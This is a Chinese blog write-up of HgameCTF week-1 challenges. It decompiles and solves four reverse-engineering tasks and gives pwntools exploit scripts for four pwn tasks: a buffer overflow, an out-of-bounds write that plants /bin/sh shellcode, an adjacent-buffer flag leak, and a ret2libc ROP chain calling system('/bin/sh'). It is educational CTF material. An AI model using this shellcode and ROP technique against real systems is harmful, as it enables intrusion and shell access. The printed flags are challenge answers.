<!--yml
category: 未分类
date: 2022-04-26 14:48:32
-->

# HgameCTF(week1)-RE,PWN题解析_合天网安实验室的博客-CSDN博客

> 来源：[https://blog.csdn.net/qq_38154820/article/details/106330204](https://blog.csdn.net/qq_38154820/article/details/106330204)

**##RE**

* * *

**###maze**

 **这个题目从题目名上可以知道是一个迷宫题目，迷宫题目主要把握住迷宫地图，方向键还有起点终点就好。ida打开

```
while ( (signed int)v4 < SHIDWORD(v4) )
  {
v3 = input[(signed int)v4];
if ( v3 == 'd' )
{
  local += 4;
}
else if ( v3 > 100 )
{
  if ( v3 == 's' )
  {
local += 64;
  }
  else
  {
if ( v3 != 'w' )
{
LABEL_12:
  puts("Illegal input!");
  exit(0);
}
local -= 64;
  }
}
else
{
  if ( v3 != 'a' )
goto LABEL_12;
  local -= 4;
}
if ( local < (char *)&unk_602080 || local > (char *)&unk_60247C || *(_DWORD *)local & 1 )
  goto LABEL_22;
LODWORD(v4) = v4 + 1;
  } 
```

从中可以确定方向键为awds,确定了起点终点，但是每次走的步数不太一样，因为按理说步数应该是1但是这里确实4。

先复制出地图，64字节为一行

01 01 01 01 01 00 00 01  01 00 01 00 01 00 00 01 01 00 01 01 01 00 01 01  01 01 01 00 01 00 01 00 01 01 01 01 01 00 01 01  01 00 00 00 01 00 01 00 01 00 00 01 01 00 00 01  01 00 01 00 01 00 00 01
01 01 01 00 00 01 00 00  01 01 00 01 01 01 01 00 01 01 01 01 01 01 01 00  01 00 00 00 01 00 00 01 01 00 01 01 01 01 00 01  01 01 01 00 01 00 01 01 01 01 00 01 01 01 01 00  01 01 00 01 01 01 01 00
01 00 01 01 00 00 01 01  01 00 01 01 01 01 00 01 01 00 01 00 01 01 01 00  01 01 01 00 01 01 01 00 01 01 01 00 01 01 00 01  01 00 00 00 01 00 01 00 01 01 01 00 01 01 00 01  01 01 01 00 01 00 01 00
01 00 01 00 00 00 01 01  01 01 01 01 01 01 01 00 01 00 01 01 01 00 01 01  01 00 01 01 01 00 01 00 01 00 00 00 01 01 00 01  01 01 01 01 01 01 01 00 01 01 01 01 01 00 01 00  01 01 01 01 01 01 01 00
01 01 00 01 00 01 01 00  01 01 01 01 01 00 00 01 01 01 01 01 01 01 01 01  01 00 01 00 01 00 01 01 01 01 01 00 01 00 00 01  01 01 01 01 01 00 01 01 01 00 00 01 01 01 01 00  01 00 00 01 01 00 00 01
01 01 01 00 00 00 01 01  00 00 01 00 00 01 01 00 00 01 00 00 00 01 01 01  00 01 00 00 00 00 00 01 01 00 01 01 01 00 00 00  01 00 00 01 01 00 00 01 01 00 01 01 01 00 00 00  01 01 00 01 01 00 01 00
01 00 01 00 01 00 00 00  01 01 01 01 01 00 01 00 01 01 00 01 01 00 01 01  01 01 01 00 00 00 01 00 01 01 01 00 01 00 00 00  01 00 00 01 01 00 01 00 01 00 01 01 01 00 00 00  01 01 01 00 01 01 01 01
01 01 01 00 01 00 00 00  01 00 01 00 01 00 01 00 01 00 01 01 01 01 00 01  01 00 00 00 00 01 01 00 01 00 01 01 01 00 01 01  01 01 00 01 01 00 00 00 01 01 01 01 01 01 01 00  01 01 01 00 01 01 01 01
01 00 00 00 01 00 01 01  01 00 00 01 01 00 00 00 01 00 00 00 01 00 00 01  01 00 00 00 00 00 01 00 01 00 00 01 00 01 01 00  00 01 01 01 00 00 01 00 00 00 01 01 01 01 01 01  01 00 01 01 01 00 00 01
01 01 00 01 01 01 01 00  01 01 00 01 01 00 00 00 01 00 01 01 01 00 00 00  01 01 00 01 00 00 01 00 01 01 01 00 00 01 00 00  01 00 01 01 01 01 01 00 00 00 00 00 01 00 01 00  01 01 00 01 01 00 01 00
01 00 00 01 01 00 01 01  01 01 01 00 01 01 00 01 01 00 01 00 01 01 01 00  01 01 01 01 00 01 00 00 00 01 01 00 00 01 01 01  01 01 01 00 01 01 01 01 00 00 00 01 01 00 01 00  01 01 00 01 01 00 00 00
01 01 01 01 01 00 00 01  01 00 00 00 01 00 01 01 01 01 01 00 01 00 01 01  01 00 01 00 01 00 00 01 01 00 01 00 01 01 01 00  01 01 00 01 01 00 00 01 00 01 01 00 01 01 01 01  01 00 01 01 01 01 01 00
01 01 01 00 01 00 00 01  01 00 00 00 01 00 00 01 01 00 00 00 01 00 00 01  01 01 00 01 01 00 01 01 01 01 00 01 01 00 00 00  01 00 00 01 01 00 00 00 00 01 00 00 00 01 00 00  01 00 01 01 01 00 00 00
01 00 01 00 01 00 01 01  01 00 00 00 01 01 01 01 01 01 01 00 01 00 01 01  01 00 00 01 01 00 00 00 01 00 00 00 01 00 01 00  01 01 01 01 01 00 00 01 01 01 01 00 00 01 01 01  01 01 01 01 01 00 01 00
01 00 01 01 01 00 00 01  01 01 01 00 01 01 01 01 01 00 00 00 01 01 01 01  01 01 00 01 01 00 01 00 01 01 01 01 01 00 01 01  01 00 01 01 01 00 00 01 01 00 00 00 00 00 00 00  00 01 01 00 00 01 01 01
01 01 01 00 01 01 01 00  01 01 01 00 01 00 01 00 01 01 01 00 01 00 00 01  01 01 00 01 01 01 01 00 01 00 01 01 01 00 00 01  01 00 01 01 01 01 01 01 01 01 01 01 01 00 01 00  01 01 01 01 01 01 00 01

由于左右移位数为4，那么地图有些就是用不上的，可以每隔一行去掉三行。经过精简后的地图如下。

01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01|00|01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 00 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 00 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 00 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 00 00 00 00 00 00 00 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 00 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 00 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 00 01 00 00 00 00 01 01 01
01 01 01 01 01 01 01 00 01 00 01 01 00 01 01 01
01 01 01 01 01 01 01 00 00 00 01 01 00 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 00 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 00 00 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 00 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 00 00|00|
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01

起点和终点已经标出来，

可以得到flag：

hgame{ssssddddddsssssddwwdddssssdssdd}

**###bitwise_operation2**

输入先把hgame{}切割掉，经过check_number函数，该函数主要是合并数字，比如输入一个0F，那么在内存中显示为ascii，即30 66，该函数即在内存中存储,0F.然后经过异或运算。

```
if ( strlen(input) == 39
&& input[0] == 'h'
&& input[1] == 'g'
&& input[2] == 'a'
&& input[3] == 'm'
&& input[4] == 'e'
&& input[5] == '{'
&& input[38] == '}' )
  {
left = 0LL;
v8 = 0;
right = 0LL;
v10 = 0;
check_number((__int64)&left, (__int64)&input[6]);
check_number((__int64)&right, (__int64)&input[22]);
for ( i = 0; i <= 7; ++i )
{
  *((_BYTE *)&left + i) = ((*((_BYTE *)&left + i) & 0xE0) >> 5) | 8 * *((_BYTE *)&left + i);// 循环左移三位
  *((_BYTE *)&left + i) = *((_BYTE *)&left + i) & 0x55 ^ ((*((_BYTE *)&right + 7 - i) & 0xAA) >> 1) | *((_BYTE *)&left + i) & 0xAA;
  *((_BYTE *)&right + 7 - i) = 2 * (*((_BYTE *)&left + i) & 0x55) ^ *((_BYTE *)&right + 7 - i) & 0xAA | *((_BYTE *)&right + 7 - i) & 0x55;
  *((_BYTE *)&left + i) = *((_BYTE *)&left + i) & 0x55 ^ ((*((_BYTE *)&right + 7 - i) & 0xAA) >> 1) | *((_BYTE *)&left + i) & 0xAA;
}
for ( j = 0; j <= 7; ++j )
{
  *((_BYTE *)&left + j) ^= key[j];
  if ( *((_BYTE *)&left + j) != byte_602050[j] )
  {
puts("sry, wrong flag");
exit(0);
  }
}
for ( k = 0; k <= 7; ++k )
{
  *((_BYTE *)&right + k) ^= *((_BYTE *)&left + k) ^ key[k];
  if ( *((_BYTE *)&right + k) != byte_602060[k] )
  {
puts("Just one last step");
exit(0);
  }
}
puts("Congratulations! You are already familiar with bitwise operation."); 
```

看起来每次运算只涉及对称的两个字节，想爆破，出不来，只能安心写逆算法。

```
#!/usr/bin/python
#coding:utf-8
left_string = "e4sy_Re_"
right_string = "Easylif3"
key = [0x4C,0x3C,0xD6,0x36,0x50,0x88,0x20,0xCC]

# left = [0x5C ,0xC2 ,0xBE ,0x9A ,0xD3 ,0xC6 ,0x6F,0xBC]
# right =[0xEB ,0x82 ,0xD6 ,0xB1 ,0xAF ,0xC1 ,0x2C,0x0F]
left = []
right = []
for i in range(8):
  left.append(ord(left_string[i])^key[i])
  right.append(ord(right_string[i])^left[i])

right = right[::-1]
flag1 = []
flag2 = []

def circular_shift_left(int_value,k,bit = 8):

bit_string = '{:0%db}' % bit

bin_value = bit_string.format(int_value) # 8 bit binary

bin_value = bin_value[k:] + bin_value[:k]

int_value = int(bin_value,2)

return int_value

def toStr(num,base):
convertString = "0123456789ABCDEF"#最大转换为16进制
if num < base:
return convertString[num]
else:
return toStr(num//base,base)  + convertString[num%base]

for i in range(8):
  left_q_a = left[i]&0xaa
  left_xor = left[i]&0x55

  right_xor = right[i]&0xaa
  right_q_5 = right[i]&0x55

  left_q_5 = left_xor^((right[i]&0xaa)>>1)

  left_temp = left_q_5|left_q_a
  right_q_a = (((left_temp&0x55)<<1)^right_xor)
  right_temp =  right_q_5|right_q_a

  flag2.append(right_temp)
  left_q_a_2 = left_temp&0xaa
  left_xor_2 = left_temp&0x55
  left_q_5_2 = ((right_temp&0xaa)>>1)^left_xor_2

  left_temp_2 = left_q_5_2|left_q_a_2
  left_temp_2 = circular_shift_left(left_temp_2,5,8)
  flag1.append(left_temp_2)

flag2 = flag2[::-1]

for i in range(8):
  print toStr(flag1[i],16).lower()
for i in range(8):
  print toStr(flag2[i],16).lower() 
```

得到flag:

hgame{0f233e63637982d266cbf41ecb1b0102}

**###advance** 

**就一个改变符号表的base64 flag:**

**hgame{b45e6a_i5_50_eazy_6VVSQ}** 

**###cpp** 

**题目主要思路是输入按_切割，然后经过矩阵相乘，再跟一个矩阵对比。**

```
for ( i = 6i64; ; i = v11 + 1 ) // 按_切割
{
  LOBYTE(v0) = '_';
  v11 = sub_7FF735394060(&input, v0, i);// 返回_位置
  if ( v11 == -1 )
break;
  v16 = sub_7FF7353943B0(&input, &v40, i, v11 - i);
  v17 = v16;
  v1 = ret_value(v16);
  v18 = atoll(v1);
  sub_7FF735394350(&v14, &v18);
  sub_7FF735392FA0(&v40);
}
v19 = sub_7FF7353943B0(&input, &v41, i, 61 - i);
v20 = v19;
v2 = ret_value(v19);
v21 = atoll(v2);
sub_7FF735394350(&v14, &v21);
sub_7FF735392FA0(&v41);
v31 = 'hg';
v32 = 'am';
v33 = 'e';
v34 = 're';
v35 = 'is';
v36 = 'so';
v37 = 'so';
v38 = 'ea';
v39 = 'sy';
v22 = 1i64;
v23 = 0i64;
v24 = 1i64;
v25 = 0i64;
v26 = 1i64;
v27 = 1i64;
v28 = 1i64;
v29 = 2i64;
v30 = 2i64;
for ( j = 0i64; j < 3; ++j )
{
  for ( k = 0i64; k < 3; ++k )
  {
v12 = 0i64;
for ( l = 0; l < 3; ++l )
  v12 += *(&v22 + 3 * l + k) * *(_QWORD *)sub_7FF7353931E0(&v14, l + 3 * j);
if ( *(&v31 + 3 * j + k) != v12 )
{
  v3 = sub_7FF735391900(std::cout, "error");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v3, sub_7FF735392830);
  sub_7FF735393010(&v14);
  sub_7FF735392FA0(&input);
  return 0i64;
}
  }
}
v6 = sub_7FF735391900(std::cout, "you are good at re"); 
```

先从内存中复制出已知的两个矩阵。

0x6867,0x616D,0x0065,
0x7265,0x6973,0x736F,
0x736F,0x6561,0x7379,

01,00,01,
00,01,01,
01,02,02,

9个元素，那么输入的flag也应该为九个元素，也就是需要切割为九个部分。

先假设为

a,b,c,
d,e,f,
g,h,i

然后和矩阵2相乘再跟矩阵一对比。可以简化为式子

a+c=0x6867
b+2*c=0x616D
a+b+2*c==0x0065

d+f=0x7265
e+2*f=0x6973
d+e+2*f=0x736F

g+i=0x736F
h+2*i=0x6561
g+h+2*i=0x7379

可以用z3来求。

from z3 import *
x = Solver()

flag = [Int('flag%d'%i) for i in range(9)]

x.add()

x.add(flag[0]+flag[2]==0x6867)
x.add(flag[1]+2*flag[2]==0x616D)
x.add(flag[0]+flag[1]+2*flag[2]==0x0065)
x.add(flag[3]+flag[5]==0x7265)
x.add(flag[4]+2*flag[5]==0x6973)
x.add(flag[3]+flag[4]+2*flag[5]==0x736F)
x.add(flag[6]+flag[8]==0x736F)
x.add(flag[7]+2*flag[8]==0x6561)
x.add(flag[6]+flag[7]+2*flag[8]==0x7379)
print x.check()

m = x.model()

for i in flag:
    print m[i]

得到flag:

hgame{-24840*-78193_51567_2556*-26463_26729_3608_-25933_25943}

**##PWN**

* * *

****###Hard_AAA****

 **这个存在后门，直接溢出覆盖对比就行。exp

```
#!/usr/bin/python
#coding:utf-8
from pwn import *
from time import *
from LibcSearcher import *

context.log_level="debug"

EXEC_FILE = "./ROP_LEVEL0"
REMOTE_LIBC = "./db/libc6_2.24-9ubuntu2.2_amd64.so"

def main():

    r = remote('47.103.214.163', 20000)
    elf = ELF(EXEC_FILE)
    #libc = ELF(REMOTE_LIBC)

    r.recvuntil('!')
    raw_input()
    r.send('\x00'*120+'0O00O0o\x00O0\x00') 
```

```
r.interactive()

if __name__ == '__main__':
  main() 
```

**###Number_Killer**

这个题目比较有意思。

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4[11]; // [rsp+0h] [rbp-60h]
  int i; // [rsp+5Ch] [rbp-4h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  memset(v4, 0, 80uLL);
  puts("Let's Pwn me with numbers!");
  for ( i = 0; i <= 19; ++i )
  v4[i] = readll();
  return 0;
} 
```

该程序先分配80个字节，但是v4是int64类型的，而且复制了20次，那么就会存在数组越界。再看readll函数。

```
__int64 readll()
{
  char nptr[8]; // [rsp+0h] [rbp-20h]
  __int64 v2; // [rsp+8h] [rbp-18h]
  int v3; // [rsp+10h] [rbp-10h]
  int v4; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  *(_QWORD *)nptr = 0LL;
  v2 = 0LL;
  v3 = 0;
  v4 = 0;
  for ( i = 0; read(0, &nptr[i], 1uLL) > 0 && i <= 19 && nptr[i] != 10; ++i )
;
  return atoll(nptr);
} 
```

最多读取19位，然后变为long long int变量。还存在有一个gitt函数。

```
push rbp
mov rbp, rsp
jmp rsp 
```

可以jmp rsp，那么就可以植入shellcode来运行。

还存在一个问题，比如我植入的是下面的shellcode。

```
#\x6a\x42\x58\xfe
#\xc4\x48\x99\x52
#\x48\xbf\x2f\x62
#\x69\x6e\x2f\x2f
#\x73\x68\x57\x54
#\x5e\x49\x89\xd0
#\x49\x89\xd2\x0f
#\x05 
```

那么就是可能会发送到0xd089495e54576873，这个有符号整形，会变成负数。可以通过发送符号要求的shellcode，这个找起来比较麻烦，所以可以改造一下。

可以插入一些没有意义的指令，比如0x90，但是这个也会变成负数，可以插入50 58，即push rax,pop rax，那么就可以绕过刚刚那个限制了。

原先的shellcode

```
push 42h         6a 42
pop rax         58
inc ah         FE C4
cqo        48 99
pushrdx        52
mov rdi, 68732F2F6E69622Fh     48 BF 2F 62 69 6E 2F 2F 73 68
push rdi        57
push rsp        54
pop rsi        5e 
mov r8, rdx         49 89 d0
mov r10, rdx        49 89 d2
syscall       0f 5 
```

经过改造之后

```
push rax
pop  rax
cqo
push rdx
push rax
pop  rax
mov  rdi, 68732F2F6E69622Fh
pop  rax
push rax
push rdi
push rsp
pop  rsi
mov  r8, rdx
push rax
pop  rax
push rax
pop  rax
push rax
pop  rax
mov  r10, rdx
syscall 
```

还有一个点就是，循环次数也在覆盖范围只能，得先算法他的值，不能改变他的值，不然会出错。然后跳转到gift函数就可以了。

```
#!/usr/bin/python
#coding:utf-8
from pwn import *
from time import *
from LibcSearcher import *

context.log_level="debug"

EXEC_FILE = "./Number_Killer"
REMOTE_LIBC = "./db/libc6_2.24-9ubuntu2.2_amd64.so"

r = remote('172.17.0.2', 10002)
elf = ELF(EXEC_FILE)
libc = ELF(REMOTE_LIBC)

r.recvuntil("!")
r.sendline(str(0x505850c4fe58426a))
r.sendline(str(0x5850529948585058))
r.sendline(str(0x2f2f6e69622fbf48))
r.sendline(str(0x495e545758506873))
r.sendline(str(0x585058505850d089))
r.sendline(str(0x000000050fd28949))
r.sendline(str(0))
r.sendline(str(0))
r.sendline(str(0))
r.sendline(str(0))
r.sendline(str(0))
r.sendline(str(47244640256))
r.sendline(str(0x40078D))
r.sendline(str(0x40078D))

r.sendline(str(0x505850c4fe58426a))
r.sendline(str(0x5850529948585058))
r.sendline(str(0x2f2f6e69622fbf48))
r.sendline(str(0x495e545758506873))
r.sendline(str(0x585058505850d089))
r.sendline(str(0x000000050fd28949))

r.interactive() 
```

**###One_Shot**

程序读取flag，然后要求输入name，最大可以输入32个字节，name实际能存储的加上\x00也就32个字节，然后马上到flag储存的内容，程序还会输出name，那么flag也会跟着一起输出。

```
#!/usr/bin/python
#coding:utf-8
from pwn import *
from time import *
from LibcSearcher import *

context.log_level="debug"

EXEC_FILE = "./ROP_LEVEL0"
REMOTE_LIBC = "./db/libc6_2.24-9ubuntu2.2_amd64.so"

r = remote('47.103.214.163',20002)
elf = ELF(EXEC_FILE)
#libc = ELF(REMOTE_LIBC)

r.recvuntil('?')
r.sendline('a'*32)
r.recvuntil('!')
r.sendline(str(0x6010E0))
print r.recv() 
```

```
r.interactive() 
```

**###ROP_LEVEL0**

该题目存在一个溢出点，可以覆盖返回地址先通过puts函数输出read函数的地址，然后通过LibcSearcher匹配到相应的libc版本。再跳回主函数，再次溢出。通过相应的libc版本得到system地址和"/bin/sh"地址，运行system函数getshell。

```
#!/usr/bin/python
#coding:utf-8
from pwn import *
from time import *
from LibcSearcher import *

context.log_level="debug"

EXEC_FILE = "./ROP_LEVEL0"
REMOTE_LIBC = "./db/libc6_2.24-9ubuntu2.2_amd64.so"

r = remote('47.103.214.163',20003)
elf = ELF(EXEC_FILE)
#libc = ELF(REMOTE_LIBC)

read_got = elf.got['read']
puts_plt = elf.plt['puts']
#padding == 88

r.recv()
payload = 'a'*88
payload += p64(0x400753)# pop rdi
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(0x040065C)
r.sendline(payload)

addr = u64(r.recvn(6).ljust(8,'\x00'))
print hex(addr)

r.recv()

obj = LibcSearcher('read', addr)
libc_addr = addr - obj.dump('read')
system_addr = libc_addr + obj.dump('system')
bin_sh = libc_addr + obj.dump('str_bin_sh') 
```

```
payload = 'a'*88
payload += p64(0x400753)
payload += p64(bin_sh)
payload += p64(system_addr)
raw_input()
r.sendline(payload) 
```

```
r.interactive() 
```

如果想更多系统的学习CTF，可点击文末“阅读原文”，进入CTF实验室学习，里面涵盖了6个题目类型系统的学习路径和实操环境。

![](img/a36916f7004de0a0653211c700381e8b.png)

完

点击获取：[2019原创干货集锦 | 掌握学习主动权](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA%3D%3D&chksm=bd5928c58a2ea1d36bbab9c96da5b057cb79f1945d84db2d55740e90d3237ac31964404d8d5d&idx=1&mid=2652853256&scene=21&sn=090913b6b5c56bf3dd9f44a6207131d8#wechat_redirect)

大家有好的技术原创文章

欢迎投稿至邮箱：edu@heetian.com

合天会根据文章的时效、新颖、文笔、实用等多方面评判给予200元-800元不等的稿费哦

有才能的你快来投稿吧！

了解投稿详情点击——[**重金悬赏 | 合天原创投稿涨稿费啦！**](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA%3D%3D&chksm=bd59304b8a2eb95d8ce88b202c516f3a4366ac5b2da8047180012c46ba7f0e9aa555e3360971&idx=2&mid=2652851334&scene=21&sn=c3cddfe9e230204c6892b06159d419d1#wechat_redirect)

![](img/1f4d2bcd016e34f15585e72d9ada4a63.png)

![](img/11cf5b91394d35c134358aff666723bf.png)

![](img/d9870527d545ded9194582008312fa8f.png)

戳“阅读原文”进入CTF实验室！****